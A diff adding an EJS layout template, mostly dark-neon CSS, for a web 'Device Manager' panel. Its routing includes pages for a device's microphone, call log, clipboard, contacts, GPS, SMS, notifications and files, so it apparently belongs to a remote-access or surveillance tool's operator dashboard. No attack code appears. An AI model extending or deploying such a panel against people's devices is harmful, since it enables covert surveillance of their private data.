@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<% include partials/head.ejs %>
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#0a0e17">
+</head>
+
+<body>
+    <script>
+        var baseURL = '<%= baseURL %>';
+    </script>
+
+    <style type="text/css">
+        /* ============================================
+           DEVICE MANAGER - Dark Neon Theme
+           Layout wrapper for all sub-pages
+           ============================================ */
+
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont,
+                         'Segoe UI', Roboto, sans-serif;
+            background: #0a0e17;
+            background-image:
+                radial-gradient(circle at 10% 5%, rgba(124, 58, 237, 0.12), transparent 40%),
+                radial-gradient(circle at 90% 95%, rgba(0, 217, 255, 0.10), transparent 40%);
+            background-attachment: fixed;
+            color: #e6edf3;
+            min-height: 100vh;
+        }
+
+        .ui.container {
+            width: 100% !important;
+            max-width: 1600px !important;
+            margin: 0 auto !important;
+            padding: 20px 16px 40px !important;
+        }
+
+        /* Main grid layout (menu + content) */
+        .ui.grid {
+            margin: 8px 0 0 0 !important;
+            gap: 20px;
+        }
+
+        /* Content column */
+        .ui.grid > .twelve.wide.column {
+            padding: 0 !important;
+            min-width: 0;
+            width: auto !important;
+            flex: 1;
+        }
+
+        /* ============================================
+           Content wrapper — glassy card
+           ============================================ */
+        .ui.grid > .twelve.wide.column > * {
+            border-radius: 18px !important;
+        }
+
+        /* Any direct segment/card inside content */
+        .ui.segment,
+        .ui.card,
+        .ui.message {
+            background: rgba(19, 26, 38, 0.75) !important;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(0, 217, 255, 0.13) !important;
+            border-radius: 18px !important;
+            box-shadow:
+                0 20px 60px rgba(0, 0, 0, 0.45),
+                0 0 0 1px rgba(255, 255, 255, 0.03),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05) !important;
+            padding: 24px !important;
+            color: #e6edf3 !important;
+        }
+
+        /* Nested segments (no extra card look) */
+        .ui.segment .ui.segment {
+            background: rgba(10, 14, 23, 0.5) !important;
+            box-shadow: none !important;
+            padding: 16px !important;
+        }
+
+        /* ============================================
+           Headers inside content
+           ============================================ */
+        .ui.grid > .twelve.wide.column h1,
+        .ui.grid > .twelve.wide.column h2,
+        .ui.grid > .twelve.wide.column h3,
+        .ui.grid > .twelve.wide.column h4,
+        .ui.grid > .twelve.wide.column h5 {
+            color: #e6edf3 !important;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+
+        .ui.grid > .twelve.wide.column h1 {
+            font-size: 1.4rem !important;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px !important;
+            padding-bottom: 12px;
+            border-bottom: 1px solid rgba(0, 217, 255, 0.15);
+        }
+
+        .ui.grid > .twelve.wide.column h1::before {
+            content: '';
+            display: inline-block;
+            width: 6px;
+            height: 22px;
+            background: linear-gradient(180deg, #00d9ff, #7c3aed);
+            border-radius: 3px;
+            margin-right: 12px;
+            vertical-align: middle;
+            box-shadow: 0 0 12px rgba(0, 217, 255, 0.6);
+        }
+
+        /* Dividing headers */
+        .ui.dividing.header {
+            border-bottom: 1px solid rgba(0, 217, 255, 0.15) !important;
+            padding-bottom: 10px !important;
+        }
+
+        /* ============================================
+           Text / links inside content
+           ============================================ */
+        .ui.grid > .twelve.wide.column p,
+        .ui.grid > .twelve.wide.column span,
+        .ui.grid > .twelve.wide.column div,
+        .ui.grid > .twelve.wide.column li {
+            color: #c5cfdb;
+        }
+
+        .ui.grid > .twelve.wide.column a:not(.ui.button) {
+            color: #00d9ff !important;
+            text-decoration: none;
+            transition: color 0.2s ease;
+        }
+
+        .ui.grid > .twelve.wide.column a:not(.ui.button):hover {
+            color: #7c3aed !important;
+            text-decoration: underline;
+        }
+
+        /* ============================================
+           Buttons (global inside content)
+           ============================================ */
+        .ui.grid > .twelve.wide.column .ui.button {
+            background: rgba(10, 14, 23, 0.7) !important;
+            color: #e6edf3 !important;
+            border: 1px solid #223047 !important;
+            border-radius: 10px !important;
+            font-weight: 600 !important;
+            letter-spacing: 0.5px;
+            padding: 10px 16px !important;
+            transition: all 0.2s ease !important;
+            text-transform: none;
+            box-shadow: none !important;
+        }
+
+        .ui.grid > .twelve.wide.column .ui.button:hover {
+            background: rgba(0, 217, 255, 0.08) !important;
+            border-color: #00d9ff !important;
+            color: #00d9ff !important;
+            transform: translateY(-1px);
+        }
+
+        .ui.grid > .twelve.wide.column .ui.primary.button,
+        .ui.grid > .twelve.wide.column .ui.blue.button {
+            background: linear-gradient(135deg, #00d9ff 0%, #7c3aed 100%) !important;
+            border: none !important;
+            color: #fff !important;
+            box-shadow: 0 0 20px rgba(0, 217, 255, 0.3) !important;
+        }
+
+        .ui.grid > .twelve.wide.column .ui.primary.button:hover,
+        .ui.grid > .twelve.wide.column .ui.blue.button:hover {
+            box-shadow: 0 6px 25px rgba(0, 217, 255, 0.55) !important;
+            color: #fff !important;
+            border: none !important;
+        }
+
+        .ui.grid > .twelve.wide.column .ui.red.button,
+        .ui.grid > .twelve.wide.column .ui.negative.button {
+            background: linear-gradient(135deg, #ff3860, #c81e3f) !important;
+            border: none !important;
+            color: #fff !important;
+        }
+
+        .ui.grid > .twelve.wide.column .ui.green.button,
+        .ui.grid > .twelve.wide.column .ui.positive.button {
+            background: linear-gradient(135deg, #00ff9d, #00b377) !important;
+            border: none !important;
+            color: #002218 !important;
+        }
+
+        /* ============================================
+           Inputs
+           ============================================ */
+        .ui.grid > .twelve.wide.column .ui.input > input,
+        .ui.grid > .twelve.wide.column input:not([type="checkbox"]):not([type="radio"]),
+        .ui.grid > .twelve.wide.column textarea,
+        .ui.grid > .twelve.wide.column select {
+            background: rgba(10, 14, 23, 0.7) !important;
+            border: 1px solid #223047 !important;
+            border-radius: 10px !important;
+            color: #e6edf3 !important;
+            padding: 10px 14px !important;
+            font-size: 16px !important;
+            transition: all 0.2s ease;
+        }
+
+        .ui.grid > .twelve.wide.column input:focus,
+        .ui.grid > .twelve.wide.column textarea:focus {
+            border-color: #00d9ff !important;
+            box-shadow: 0 0 0 3px rgba(0, 217, 255, 0.15) !important;
+            outline: none !important;
+        }
+
+        /* ============================================
+           Tables
+           ============================================ */
+        .ui.grid > .twelve.wide.column table.ui.table {
+            background: transparent !important;
+            border: 1px solid rgba(34, 48, 71, 0.6) !important;
+            border-radius: 14px !important;
+            overflow: hidden !important;
+            border-collapse: separate;
+            border-spacing: 0;
+        }
+
+        .ui.grid > .twelve.wide.column table.ui.table thead th {
+            background: rgba(10, 14, 23, 0.6) !important;
+            color: #00d9ff !important;
+            font-size: 0.72rem !important;
+            font-weight: 700 !important;
+            text-transform: uppercase;
+            letter-spacing: 1.2px;
+            padding: 14px 16px !important;
+            border-bottom: 1px solid rgba(34, 48, 71, 0.6) !important;
+            border-left: none !important;
+        }
+
+        .ui.grid > .twelve.wide.column table.ui.table tbody td {
+            padding: 12px 16px !important;
+            border-top: 1px solid rgba(34, 48, 71, 0.4) !important;
+            border-left: none !important;
+            color: #e6edf3 !important;
+            font-size: 0.88rem;
+            vertical-align: middle;
+            word-break: break-word;
+        }
+
+        .ui.grid > .twelve.wide.column table.ui.table tbody tr:hover {
+            background: rgba(0, 217, 255, 0.05) !important;
+        }
+
+        /* ============================================
+           Labels, badges, tags
+           ============================================ */
+        .ui.grid > .twelve.wide.column .ui.label {
+            background: rgba(0, 217, 255, 0.12) !important;
+            color: #00d9ff !important;
+            border: 1px solid rgba(0, 217, 255, 0.25) !important;
+            border-radius: 20px !important;
+            padding: 4px 10px !important;
+            font-weight: 600;
+            font-size: 0.75rem;
+        }
+
+        /* ============================================
+           MODAL (for sub-pages that use modals)
+           ============================================ */
+        .ui.modal {
+            background: #131a26 !important;
+            border: 1px solid rgba(0, 217, 255, 0.2) !important;
+            border-radius: 16px !important;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.7) !important;
+        }
+
+        .ui.modal > .header {
+            background: #1a2332 !important;
+            border-bottom: 1px solid rgba(34, 48, 71, 0.6) !important;
+            color: #e6edf3 !important;
+            border-radius: 16px 16px 0 0 !important;
+            padding: 16px 20px !important;
+        }
+
+        .ui.modal > .content,
+        .ui.modal > .actions {
+            background: #131a26 !important;
+            border-color: rgba(34, 48, 71, 0.4) !important;
+            color: #e6edf3 !important;
+            padding: 20px !important;
+        }
+
+        /* ============================================
+           MOBILE — Stack menu above content
+           ============================================ */
+        @media (max-width: 991px) {
+            .ui.container {
+                padding: 12px 10px 32px !important;
+            }
+
+            .ui.grid {
+                gap: 14px;
+                margin: 0 !important;
+            }
+
+            /* Menu becomes full width */
+            .ui.grid > .four.wide.column {
+                width: 100% !important;
+                padding: 0 !important;
+                max-width: 100% !important;
+            }
+
+            /* Content becomes full width */
+            .ui.grid > .twelve.wide.column {
+                width: 100% !important;
+                padding: 0 !important;
+            }
+
+            .ui.segment,
+            .ui.card,
+            .ui.message {
+                padding: 18px 14px !important;
+                border-radius: 14px !important;
+            }
+
+            .ui.grid > .twelve.wide.column h1 {
+                font-size: 1.1rem !important;
+                letter-spacing: 1.5px;
+                margin-bottom: 16px !important;
+            }
+
+            .ui.grid > .twelve.wide.column h1::before {
+                height: 18px;
+                width: 5px;
+            }
+
+            /* Tables scroll horizontally on mobile */
+            .ui.grid > .twelve.wide.column table.ui.table {
+                display: block;
+                overflow-x: auto;
+                -webkit-overflow-scrolling: touch;
+                white-space: nowrap;
+            }
+
+            .ui.grid > .twelve.wide.column table.ui.table thead,
+            .ui.grid > .twelve.wide.column table.ui.table tbody {
+                display: table;
+                width: 100%;
+                min-width: 600px;
+            }
+
+            .ui.grid > .twelve.wide.column table.ui.table thead {
+                display: table-header-group;
+            }
+
+            .ui.grid > .twelve.wide.column table.ui.table tbody {
+                display: table-row-group;
+            }
+        }
+
+        /* Small phones */
+        @media (max-width: 480px) {
+            .ui.segment,
+            .ui.card,
+            .ui.message {
+                padding: 14px 12px !important;
+            }
+
+            .ui.grid > .twelve.wide.column h1 {
+                font-size: 1rem !important;
+            }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(0, 217, 255, 0.25);
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(0, 217, 255, 0.5);
+        }
+
+        /* iOS safe area */
+        @supports (padding: env(safe-area-inset-top)) {
+            .ui.container {
+                padding-left: max(16px, env(safe-area-inset-left)) !important;
+                padding-right: max(16px, env(safe-area-inset-right)) !important;
+            }
+        }
+    </style>
+
+    <div class="ui container">
+        <% include partials/header.ejs %>
+        <div class="ui grid">
+            <% include partials/deviceManagerMenu.ejs %>
+            <div class="twelve wide column">
+                <script>
+                    gtag('event', 'screen_view', {
+                        'screen_name': '<%= page %>',
+                        'app_name': 'flash'
+                    });
+                </script>
+                <% 
+                    if(page === "microphone") { %><% include deviceManagerPages/microphone.ejs %><% }
+                    else if(page === "calls") { %><% include deviceManagerPages/call_log.ejs %><% }
+                    else if(page === "clipboard") { %><% include deviceManagerPages/clipboard_log.ejs %><% }
+                    else if(page === "contacts") { %><% include deviceManagerPages/contacts.ejs %><% }
+                    else if(page === "gps") { %><% include deviceManagerPages/gps.ejs %><% }
+                    else if(page === "info") { %><% include deviceManagerPages/info.ejs %><% }
+                    else if(page === "notifications") { %><% include deviceManagerPages/notification_log.ejs %><% }
+                    else if(page === "sms") { %><% include deviceManagerPages/sms_manager.ejs %><% }
+                    else if(page === "wifi") { %><% include deviceManagerPages/wifi_manager.ejs %><% }  
+                    else if(page === "apps") { %><% include deviceManagerPages/apps.ejs %><% }  
+                    else if(page === "permissions") { %><% include deviceManagerPages/permissions.ejs %><% }                    
+                    else if(page === "files") { %><% include deviceManagerPages/file_manager.ejs %><% }
+                    else if(page === "downloads") { %><% include deviceManagerPages/downloads.ejs %><% }
+                    else if(page === "notFound") { %><% include deviceManagerPages/deviceNotFound.ejs %><% }
+                    else { %><% include deviceManagerPages/noPage.ejs %><% }
+                %>
+            </div>
+        </div>
+    </div>
+    <% include partials/footer.ejs %>
+</body>
+
+</html>
